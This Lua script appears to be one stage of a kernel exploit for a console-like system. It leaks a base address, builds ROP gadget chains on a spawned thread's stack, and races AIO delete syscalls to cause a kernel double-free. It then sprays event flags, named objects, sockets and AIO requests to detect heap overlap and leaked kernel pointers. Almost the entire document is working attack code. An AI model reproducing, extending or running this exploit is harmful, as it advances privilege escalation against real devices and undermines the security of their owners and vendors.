-- CRASH_CLASS: MODERATE
-- PROBE 66e: AIO double-free → event flag overlap detection
--
-- After the double-free, the 48B completion record block is on the
-- per-CPU free list twice. When we allocate, the same address comes
-- back. If we spray with event flag objects (538 evf_create), an evf
-- at the same address as a completion record has corrupted fields.
--
-- evf_wait(542) returns the event flag value — if it differs from
-- what we set, that proves kernel heap overlap.
--
-- Also tries: namedobj (557), socketpairs, and shm_open to spray
-- different-sized objects and detect which zone the double-free hits.

print("=== PROBE 66e: AIO + EVF OVERLAP ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then hi2 = hi2 + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local sf_lo, sf_hi = g_lohi(0x992)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(uint64(N(reqs) + 8), uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

-- Child thread: calls 662 then exits
local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared) + done_off, 0)
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- =============================================
-- [A] Baseline: create evf/namedobj BEFORE double-free
-- =============================================
print("")
print("-- A: baseline spray objects --")

-- Try creating event flags
local evf_handles_pre = {}
for i = 1, 8 do
    local np = put_str(string.format("evfpre%d", i))
    local ok, rv = pcall(function()
        return mk(538)(uint64(N(np)), uint64(0x100), uint64(0x1234 + i))
    end)
    local h = ok and N(rv) or -1
    evf_handles_pre[#evf_handles_pre + 1] = h
    if i <= 3 then
        print(string.format("  evf_create[%d] rv=%d", i, h))
    end
end

-- Try namedobj
local nobj_handles_pre = {}
for i = 1, 8 do
    local np = put_str(string.format("nobjpre%d", i))
    local ok, rv = pcall(function()
        return mk(557)(uint64(N(np)))
    end)
    local h = ok and N(rv) or -1
    nobj_handles_pre[#nobj_handles_pre + 1] = h
    if i <= 3 then
        print(string.format("  namedobj[%d] rv=%d (0x%X)", i, h, h >= 0 and h or 0))
    end
end

-- =============================================
-- [B] Submit AIO, poll, then race-delete → double-free
-- =============================================
print("")
print("-- B: AIO double-free --")

local BATCH = 16
local ids = memory.alloc(BATCH * 4)
local id_list = {}

for i = 0, BATCH - 1 do
    local id = submit_one()
    if id == 0 then break end
    wd(N(ids) + i * 4, id)
    id_list[#id_list + 1] = id
end

if #id_list < BATCH then
    print(string.format("only %d IDs — aborting", #id_list))
    print("=== 66e DONE ===")
    return
end

-- Poll
local poll_st = memory.alloc(BATCH * 4)
pcall(function() mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_st))) end)

-- Race
local main_st = memory.alloc(BATCH * 4)
local child_st = memory.alloc(BATCH * 4)
for i = 0, BATCH * 4 - 1, 4 do wd(N(main_st) + i, 0xCD); wd(N(child_st) + i, 0xCD) end

spawn_662_child(N(ids), BATCH, N(child_st), 0x100)
pcall(function() mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st))) end)

local dummy = 0
for w = 1, 200000 do dummy = dummy + 1 end

local doubles = 0
for i = 0, BATCH - 1 do
    local ms = rd(N(main_st) + i * 4) or 0xCD
    local cs = rd(N(child_st) + i * 4) or 0xCD
    if ms == 0 and cs == 0 then doubles = doubles + 1 end
end
print(string.format("doubles: %d/%d", doubles, BATCH))

-- =============================================
-- [C] SPRAY: create objects immediately after double-free
-- =============================================
print("")
print("-- C: post-double-free spray --")

-- Spray 1: event flags (evf_create = 538)
local evf_handles = {}
for i = 1, 32 do
    local np = put_str(string.format("evf%d", i))
    local ok, rv = pcall(function()
        return mk(538)(uint64(N(np)), uint64(0x100), uint64(0xABCD0000 + i))
    end)
    local h = ok and N(rv) or -1
    evf_handles[#evf_handles + 1] = h
end
print(string.format("  evf created: %d", #evf_handles))

-- Spray 2: named objects (namedobj_create = 557)
local nobj_handles = {}
for i = 1, 32 do
    local np = put_str(string.format("nobj%d", i))
    local ok, rv = pcall(function()
        return mk(557)(uint64(N(np)))
    end)
    local h = ok and N(rv) or -1
    nobj_handles[#nobj_handles + 1] = h
end
print(string.format("  namedobj created: %d", #nobj_handles))

-- Spray 3: socketpairs
local spray_fds = {}
for i = 1, 16 do
    local spbuf = memory.alloc(8)
    wd(N(spbuf), 0xFFFF); wd(N(spbuf) + 4, 0xFFFF)
    local ok, rv = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
    end)
    if ok and N(rv) == 0 then
        spray_fds[#spray_fds + 1] = rd(N(spbuf)) or -1
        spray_fds[#spray_fds + 1] = rd(N(spbuf) + 4) or -1
    end
end
print(string.format("  sockets created: %d fds", #spray_fds))

-- Spray 4: new AIO requests (to compete for the same zone)
local spray_aio = {}
for i = 1, 16 do
    local id = submit_one()
    if id ~= 0 then spray_aio[#spray_aio + 1] = id end
end
print(string.format("  AIO submitted: %d", #spray_aio))

-- =============================================
-- [D] Check for corruption: read back spray objects
-- =============================================
print("")
print("-- D: corruption check --")

local anomalies = 0

-- Check evf handles: are any unusual (non-sequential, wrong format)?
local prev_evf = -1
for i = 1, #evf_handles do
    local h = evf_handles[i]
    if h == -1 then
        if i <= 3 then print(string.format("  evf[%d] = -1 (create failed)", i)) end
    elseif h < 0 or h > 0x100000 then
        anomalies = anomalies + 1
        print(string.format("  ★ evf[%d] = 0x%X (ANOMALOUS handle)", i, h))
    end
    prev_evf = h
end

-- Check namedobj handles
for i = 1, #nobj_handles do
    local h = nobj_handles[i]
    if h > 0 and h < 0x100000 then
        -- Normal handle
    elseif h == -1 then
        -- Creation failed
    else
        anomalies = anomalies + 1
        print(string.format("  ★ nobj[%d] = 0x%X (ANOMALOUS)", i, h))
    end
end

-- Check evf wait (542) for value corruption
-- evf_trywait: 543(handle, wait_pattern, mode, &result)
for i = 1, math.min(#evf_handles, 8) do
    local h = evf_handles[i]
    if h > 0 and h < 0x100000 then
        local out = memory.alloc(16)
        wq(out, uint64(0xCCCCCCCC))
        local ok, rv = pcall(function()
            return mk(543)(uint64(h), uint64(0xFFFFFFFF), uint64(0x10), uint64(N(out)))
        end)
        local ret = ok and N(rv) or -999
        local val_lo = rd(N(out)) or 0xCC
        local val_hi = rd(N(out) + 4) or 0xCC
        -- Expected value: 0xABCD0000 + i
        local expected = 0xABCD0000 + i
        if val_lo ~= expected and val_lo ~= 0xCCCCCCCC then
            anomalies = anomalies + 1
            print(string.format("  ★ evf[%d] h=%d trywait val=%08X_%08X (expected %08X) rv=%d",
                i, h, val_hi, val_lo, expected, ret))
            if val_hi >= 0xFFFF8000 and val_hi ~= 0xFFFFFFFF then
                print("    *** KERNEL POINTER! ***")
            end
        end
    end
end

-- Check socket state via getsockopt
for i = 1, math.min(#spray_fds, 8) do
    local fd = spray_fds[i]
    if fd >= 0 then
        local optbuf = memory.alloc(256)
        for j = 0, 252, 4 do wd(N(optbuf) + j, 0xCC) end
        local lenp = memory.alloc(8)
        wd(N(lenp), 256)
        -- SO_TYPE (0x1008)
        local ok, rv = pcall(function()
            return mk(118)(uint64(fd), uint64(0xFFFF), uint64(0x1008),
                uint64(N(optbuf)), uint64(N(lenp)))
        end)
        local ret = ok and N(rv) or -999
        local val = rd(N(optbuf)) or 0xCC
        if val ~= 2 and val ~= 0xCC then  -- SOCK_DGRAM = 2 for AF_UNIX socketpair
            anomalies = anomalies + 1
            print(string.format("  ★ socket[%d] fd=%d SO_TYPE=%d (expected 2)", i, fd, val))
        end
    end
end

-- Poll AIO spray states
for _, id in ipairs(spray_aio) do poll_one(id) end
local aio_st_buf = memory.alloc(#spray_aio * 4 + 16)
local aio_id_buf = memory.alloc(#spray_aio * 4 + 16)
for i = 1, #spray_aio do
    wd(N(aio_id_buf) + (i-1)*4, spray_aio[i])
    wd(N(aio_st_buf) + (i-1)*4, 0xBB)
end
if #spray_aio > 0 then
    pcall(function()
        mk(664)(uint64(N(aio_id_buf)), uint64(#spray_aio), uint64(N(aio_st_buf)))
    end)
    for i = 0, #spray_aio - 1 do
        local st = rd(N(aio_st_buf) + i*4) or 0xBB
        if st ~= 0 and st ~= 0xBB and st ~= 0x00010003 and st ~= 0x80020003 then
            anomalies = anomalies + 1
            print(string.format("  ★ aio_spray[%d] id=%d state=0x%08X", i, spray_aio[i+1], st))
        end
    end
end

-- =============================================
-- [E] Delete all, check for double-free cascade
-- =============================================
print("")
print("-- E: cleanup + cascade check --")

-- Delete evf
local evf_del_fail = 0
for i = 1, #evf_handles do
    if evf_handles[i] > 0 then
        local ok, rv = pcall(function()
            return mk(539)(uint64(evf_handles[i]))
        end)
        if not ok or N(rv) ~= 0 then evf_del_fail = evf_del_fail + 1 end
    end
end

-- Delete namedobj
local nobj_del_fail = 0
for i = 1, #nobj_handles do
    if nobj_handles[i] > 0 then
        local ok, rv = pcall(function()
            return mk(558)(uint64(nobj_handles[i]))
        end)
        if not ok or N(rv) ~= 0 then nobj_del_fail = nobj_del_fail + 1 end
    end
end

-- Close sockets
for _, fd in ipairs(spray_fds) do
    if fd >= 0 then pcall(function() mk(6)(uint64(fd)) end) end
end

print(string.format("  evf del failures: %d/%d", evf_del_fail, #evf_handles))
print(string.format("  nobj del failures: %d/%d", nobj_del_fail, #nobj_handles))

print(string.format("\nTOTAL anomalies: %d", anomalies))
print(string.format("doubles: %d", doubles))
print("alive=" .. (N(native.fcall_with_rax(stub, 20)) == pid_val and "YES" or "NO"))
print("=== 66e DONE ===")
